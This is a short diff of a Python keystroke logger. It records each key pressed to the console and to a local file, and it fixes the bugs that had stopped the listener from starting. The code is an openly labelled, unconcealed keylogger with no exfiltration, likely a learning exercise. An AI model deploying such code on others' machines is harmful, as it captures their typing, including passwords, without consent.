@@ -4,7 +4,7 @@ def keypressed(key):
     print("Key pressed: ")
     print(str(key))
     if str(key) == "Key.esc":
-        return False
+        return exit()
     else:
         with open("keyFile.txt", "a") as log:
             try:
@@ -14,8 +14,7 @@ def keypressed(key):
                 print("Error")
 
 
-
-if "__name__" == "__main__":
-    listener = keyboard.Listener(on_press="keypressed")
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keypressed)
     listener.start()
     input()
